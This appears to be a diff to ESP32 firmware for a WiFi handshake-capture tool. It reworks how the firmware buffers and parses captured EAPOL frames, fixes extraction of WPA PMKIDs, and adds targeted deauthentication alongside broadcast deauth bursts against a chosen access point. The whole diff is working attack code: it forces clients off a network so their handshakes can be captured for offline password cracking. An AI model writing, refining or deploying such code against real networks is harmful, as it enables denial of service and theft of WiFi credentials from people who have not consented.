@@ -115,11 +115,14 @@ static uint8_t bestSnap[HS_SNAP_LEN];
 static uint8_t bestSnapLen = 0;
 static bool deauthStopped = false;
 
-// Lock-free single-slot hand-off from callback
-#define CANDIDATE_MAX 256
-static volatile bool candidateReady = false;
-static volatile uint16_t candidateLen = 0;
-static uint8_t candidateBuf[CANDIDATE_MAX];
+// Lock-free ring buffer hand-off from callback (4 slots for M1-M4 bursts)
+#define CANDIDATE_MAX   256
+#define CANDIDATE_SLOTS 4
+static uint8_t           candidateBuf[CANDIDATE_SLOTS][CANDIDATE_MAX];
+static volatile uint16_t candidateLen[CANDIDATE_SLOTS];
+static volatile bool     candidateReady[CANDIDATE_SLOTS];
+static volatile uint8_t  candWrite = 0;  // next slot callback writes
+static volatile uint8_t  candRead  = 0;  // next slot main loop reads
 
 static uint8_t targetBssid[6];
 static uint8_t targetChannel = 1;
@@ -291,12 +294,16 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
     for (int i = 24; i < end; i++) {
         if (payload[i] == 0x88 && payload[i + 1] == 0x8E) {
             eapolCount++;
-            if (!candidateReady) {
+            // Enqueue into next free ring slot (drop if full)
+            uint8_t w = candWrite;
+            uint8_t next = (uint8_t)((w + 1) % CANDIDATE_SLOTS);
+            if (next != candRead && !candidateReady[w]) {
                 uint16_t cl = len;
                 if (cl > CANDIDATE_MAX) cl = CANDIDATE_MAX;
-                for (uint16_t k = 0; k < cl; k++) candidateBuf[k] = payload[k];
-                candidateLen = cl;
-                candidateReady = true;
+                for (uint16_t k = 0; k < cl; k++) candidateBuf[w][k] = payload[k];
+                candidateLen[w] = cl;
+                candidateReady[w] = true;
+                candWrite = next;
             }
             break;
         }
@@ -307,23 +314,19 @@ static void IRAM_ATTR snifferCallback(void *buf, wifi_promiscuous_pkt_type_t typ
 // Robust main-loop parser
 // ---------------------------------------------------------------------------
 static int findEapolOffset(const uint8_t *p, uint16_t len) {
-    // Search after MAC header; allow QoS (2 extra bytes) and LLC/SNAP
+    // Search after MAC header; allow QoS and LLC/SNAP
     for (int i = 24; i + 8 < (int)len; i++) {
         if (p[i] == 0x88 && p[i + 1] == 0x8E) return i;
-        // LLC/SNAP AA AA 03 00 00 00 88 8E
+        // LLC/SNAP: AA AA 03 00 00 00 88 8E (OUI must be 00 00 00)
         if (i + 7 < (int)len &&
             p[i] == 0xAA && p[i+1] == 0xAA && p[i+2] == 0x03 &&
+            p[i+3] == 0x00 && p[i+4] == 0x00 && p[i+5] == 0x00 &&
             p[i+6] == 0x88 && p[i+7] == 0x8E) return i + 6;
     }
     return -1;
 }
 
-static void processCandidate() {
-    if (!candidateReady) return;
-    uint16_t len = candidateLen;
-    const uint8_t *p = candidateBuf;
-    candidateReady = false;
-
+static void processOneCandidate(const uint8_t *p, uint16_t len) {
     int off = findEapolOffset(p, len);
     if (off < 0) return;
 
@@ -331,18 +334,13 @@ static void processCandidate() {
     if (off + 4 >= (int)len) return;
     if (p[off + 3] != 0x03) return;   // not Key
 
-    // Descriptor type + Key Information (2 bytes LE after descriptor)
-    // Layout after ethertype: ver, type, len_hi, len_lo, desc, keyinfo_lo, keyinfo_hi
-    if (off + 7 >= (int)len) return;
-    uint16_t keyInfo = (uint16_t)p[off + 5] | ((uint16_t)p[off + 6] << 8);
-    // Some stacks put keyinfo at +6/+7; try both common placements
-    if (keyInfo == 0 && off + 8 < (int)len) {
-        keyInfo = (uint16_t)p[off + 6] | ((uint16_t)p[off + 7] << 8);
-    }
+    // Key Information is big-endian at off+7 (high) / off+8 (low)
+    // Layout: ethertype[2] ver[1] type[1] bodylen[2] desc[1] keyinfo[2] ...
+    if (off + 8 >= (int)len) return;
+    uint16_t keyInfo = ((uint16_t)p[off + 7] << 8) | (uint16_t)p[off + 8];
 
     bool keyAck  = (keyInfo & 0x0080) != 0;
     bool keyMic  = (keyInfo & 0x0100) != 0;
-    bool install = (keyInfo & 0x0040) != 0;
 
     if (keyAck && !keyMic) gotM1 = true;
     if (keyMic && !keyAck) gotM2 = true;
@@ -354,31 +352,59 @@ static void processCandidate() {
         bestSnapLen = sl;
     }
 
-    // PMKID KDE: 0xDD, len>=0x14, OUI 00-0F-AC, type 0x04
-    if (!hasPmkid) {
-        for (int j = off + 8; j + 22 < (int)len; j++) {
-            if (p[j] == 0xDD && p[j+1] >= 0x14 &&
-                p[j+2] == 0x00 && p[j+3] == 0x0F &&
-                p[j+4] == 0xAC && p[j+5] == 0x04) {
-                bool nz = false;
-                for (int z = 0; z < HS_PMKID_LEN; z++) {
-                    capturedPmkid[z] = p[j + 6 + z];
-                    if (capturedPmkid[z]) nz = true;
+    // PMKID KDE lives in Key Data, which starts at off+99 after the fixed
+    // EAPOL-Key header fields (through MIC and key-data-length).
+    if (!hasPmkid && off + 99 < (int)len) {
+        uint16_t kdLen = ((uint16_t)p[off + 97] << 8) | (uint16_t)p[off + 98];
+        if (kdLen > 0 && (int)off + 99 + (int)kdLen <= (int)len) {
+            int kdStart = off + 99;
+            int kdEnd   = kdStart + (int)kdLen;
+            for (int j = kdStart; j + 22 <= kdEnd; j++) {
+                if (p[j] == 0xDD && p[j+1] >= 0x14 &&
+                    p[j+2] == 0x00 && p[j+3] == 0x0F &&
+                    p[j+4] == 0xAC && p[j+5] == 0x04) {
+                    bool nz = false;
+                    for (int z = 0; z < HS_PMKID_LEN; z++) {
+                        capturedPmkid[z] = p[j + 6 + z];
+                        if (capturedPmkid[z]) nz = true;
+                    }
+                    if (nz) hasPmkid = true;
+                    break;
                 }
-                if (nz) hasPmkid = true;
-                break;
             }
         }
+    }
+}
+
+static void processCandidates() {
+    // Drain all pending ring slots (copy out first to avoid callback race)
+    for (;;) {
+        uint8_t r = candRead;
+        if (!candidateReady[r]) break;
+
+        uint8_t localBuf[CANDIDATE_MAX];
+        uint16_t len = candidateLen[r];
+        if (len > CANDIDATE_MAX) len = CANDIDATE_MAX;
+        memcpy(localBuf, candidateBuf[r], len);
+        candidateReady[r] = false;
+        candRead = (uint8_t)((candRead + 1) % CANDIDATE_SLOTS);
+
+        processOneCandidate(localBuf, len);
     }
 }
 
 // ---------------------------------------------------------------------------
 // Radio
 // ---------------------------------------------------------------------------
-static void sendDeauthBurst() {
+// clientMac: if non-NULL and not broadcast, used as addr1 (targeted deauth).
+//            if NULL, falls back to broadcast FF:FF:FF:FF:FF:FF.
+static void sendDeauthBurst(const uint8_t *clientMac) {
     esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
-    memcpy(deauthFrame + 10, targetBssid, 6);
-    memcpy(deauthFrame + 16, targetBssid, 6);
+    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+    const uint8_t *dst = (clientMac != NULL) ? clientMac : bcast;
+    memcpy(deauthFrame + 4,  dst, 6);          // addr1 = destination (client or broadcast)
+    memcpy(deauthFrame + 10, targetBssid, 6);  // addr2 = AP
+    memcpy(deauthFrame + 16, targetBssid, 6);  // addr3 = BSSID
     for (int i = 0; i < 3; i++) {
         esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
         delay(1);
@@ -387,7 +413,9 @@ static void sendDeauthBurst() {
 
 static void stopCaptureRadio() {
     captureActive = false;
-    candidateReady = false;
+    for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
+    candWrite = 0;
+    candRead = 0;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(NULL);
     delay(30);
@@ -650,7 +678,9 @@ void handshakeCaptureSetup() {
     captureActive = false;
     scanInProgress = false;
     deauthStopped = false;
-    candidateReady = false;
+    for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
+    candWrite = 0;
+    candRead = 0;
     memset(capturedPmkid, 0, sizeof(capturedPmkid));
 
     needsRedraw = true;
@@ -692,7 +722,7 @@ void handshakeCaptureLoop() {
         return;
     }
 
-    if (captureActive) processCandidate();
+    if (captureActive) processCandidates();
 
     bool up    = digitalRead(BTN_UP) == LOW;
     bool down  = digitalRead(BTN_DOWN) == LOW;
@@ -724,7 +754,9 @@ void handshakeCaptureLoop() {
             gotM2 = false;
             bestSnapLen = 0;
             deauthStopped = false;
-            candidateReady = false;
+            for (int i = 0; i < CANDIDATE_SLOTS; i++) candidateReady[i] = false;
+            candWrite = 0;
+            candRead = 0;
             memset(capturedPmkid, 0, sizeof(capturedPmkid));
             memset(bestSnap, 0, sizeof(bestSnap));
 
@@ -800,8 +832,8 @@ void handshakeCaptureLoop() {
         unsigned long interval = deauthStopped ? DEAUTH_SLOW : DEAUTH_FAST;
         if (now - lastDeauthTime >= interval) {
             lastDeauthTime = now;
-            if (!deauthStopped) sendDeauthBurst();
-            else if (((now / 2000) & 1) == 0) sendDeauthBurst();
+            if (!deauthStopped) sendDeauthBurst(NULL);
+            else if (((now / 2000) & 1) == 0) sendDeauthBurst(NULL);
         }
 
         if (eapolCount != lastEapolCount || hasPmkid != lastHasPmkid ||
